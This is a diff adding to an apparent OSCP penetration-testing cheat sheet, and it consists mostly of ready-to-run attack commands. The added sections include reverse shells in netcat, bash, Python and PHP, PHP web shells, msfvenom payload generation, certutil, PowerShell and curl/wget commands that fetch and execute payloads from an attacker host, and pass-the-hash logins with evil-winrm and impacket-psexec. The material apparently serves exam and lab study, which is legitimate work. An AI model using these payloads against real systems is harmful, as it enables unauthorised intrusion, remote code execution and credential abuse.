@@ -97,20 +97,144 @@ hydra -L users.txt -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/bru
 rlwrap nc -nlvp 4444
 ```
 
-### 3.X. Various reverse shells
+### 3.2. Various reverse shells
 
-https://highon.coffee/blog/reverse-shell-cheat-sheet/
+#### Netcat Traditional
 
-### 3.X. Web shells
+```console
+nc -e /bin/sh $KALI 4444
+```
 
-### 3.X. Payloads
+#### Netcat OpenBSD
 
-### 3.X. Windows direct connection
+```console
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 4444 >/tmp/f
+```
 
-evil-winrm
-impacket-psexec
+#### Netcat BusyBox
 
-### 3.X. Upgrade to Full TTY
+```console
+rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 4444 >/tmp/f
+```
+
+#### Bash
+
+```console
+bash -i >& /dev/tcp/$KALI/4444 0>&1
+```
+
+#### Python
+
+[Used in: digitalworld.local:JOY](https://github.com/joetanx/oscp/blob/main/practice/vulnhub/digitalworld.local-joy.md)
+
+```console
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+#### PHP
+
+|   |   |
+|---|---|
+|With `exec`|`php -r '$s=fsockopen("$KALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`|
+|With `shell_exec`|`php -r '$s=fsockopen("$KALI",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'`|
+|With backticks|``php -r '$s=fsockopen("$KALI",4444);`/bin/sh -i <&3 >&3 2>&3`;'``|
+|With `system`|`php -r '$s=fsockopen("$KALI",4444);system("/bin/sh -i <&3 >&3 2>&3");'`|
+|With `passthru`|`php -r '$s=fsockopen("$KALI",4444);passthru("/bin/sh -i <&3 >&3 2>&3", "r");'`|
+|With `popen`|`php -r '$s=fsockopen("$KALI",4444);popen("/bin/sh -i <&3 >&3 2>&3", "r");'`|
+|With `proc_open`|`php -r '$sock=fsockopen($KALI",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`|
+
+To run in a PHP file: change `php -r '$COMMAND_BLOCK'` to `<?php $COMMAND_BLOCK ?>`
+
+#### PHP web shells
+
+|   |   |
+|---|---|
+|`<?php echo passthru($_GET['k']);?>`|<https://github.com/joetanx/oscp/blob/main/practice/itsl/2021-10-24-Dealer313.md>|
+|`<?php system($_GET[base64_decode('Y21k')]);?>`|<https://github.com/joetanx/oscp/blob/main/practice/itsl/2022-01-17-Vulndc2.md>|
+|`<?php echo passthru($_GET['cmd']); ?>`|<https://github.com/joetanx/oscp/blob/main/practice/vulnhub/digitalworld.local-joy.md>|
+
+### 3.3. Payloads
+
+#### MSFVenom reverse shell TCP:
+
+☝️ omit the `x64` to generate a x86 payload
+
+|   |   |
+|---|---|
+|Linux (Python)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f py -o /var/www/html/reverse.py`|
+|Linux (ELF)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f elf -o /var/www/html/reverse.elf`|
+|Windows|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe`
+
+#### PowerShell-based reverse shell script:
+
+Download the reverse shell script:
+
+```console
+curl -O https://raw.githubusercontent.com/joetanx/oscp/main/reverse.ps1
+```
+
+Edit the address and port:
+
+```console
+sed -i 's/<ADDRESS>/kali.vx/' reverse.ps1
+sed -i 's/<PORT>/4444/' reverse.ps1
+```
+
+### 3.4. Execute payloads
+
+#### Windows: Execute reverse shell TCP payload
+
+|   |   |
+|---|---|
+|certutil|`certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %TEMP%\reverse.exe && %TEMP%\reverse.exe`|
+|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','%TEMP%\reverse.exe'); Start-Process %TEMP%\reverse.exe`|
+
+#### Windows: Execute PowerShell-based reverse shell script
+
+☝️ `Invoke-Expression` is useful if you don't want the payload to touch the disk, but it works for Powershell Scripts only
+
+(i.e. `DownloadFile` of the reverse shell executable and try to run it with `Invoke-Expression` will not work)
+
+```cmd
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/reverse.ps1')
+```
+
+#### Linux: Execute reverse shell TCP payload
+
+|   |   |
+|---|---|
+|cURL|`curl -O http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
+|Wget|`wget http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
+
+### 3.5. Windows direct connection
+
+#### evil-winrm
+
+- WinRM `5985` must be enabled on the target
+- User must be a member of `Remote Management Users` on the target
+
+|   |   |
+|---|---|
+|Username/password|`evil-winrm -i #TARGET -u $USERNAME -p $PASSWORD`|
+|Password hashes|`evil-winrm -i #TARGET -u $USERNAME -H $NT_HASH`|
+
+#### impacket-psexec
+
+- The user must be administrator on the target because PsExec uses the `ADMIN$` to run the service manager
+- LM hashes are not used from Windows 10 onwards, use either `00000000000000000000000000000000` (32 zeros) or `aad3b435b51404eeaad3b435b51404ee` (LM hash of NULL) to fill the LM hash portion for impacket-psexec or pth-winexe
+
+|   |   |
+|---|---|
+|Username/password|`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|
+|Password hashes|`impacket-psexec -hashes $LM_HASH:$NT_HASH [$DOMAIN/]$USERNAME@$TARGET [$COMMAND]`|
+
+### 3.6. Upgrade to Full TTY
+
+[Used in: digitalworld.local:JOY](https://github.com/joetanx/oscp/blob/main/practice/vulnhub/digitalworld.local-joy.md)
+
+```console
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
 
 ## 4. File transfers
 
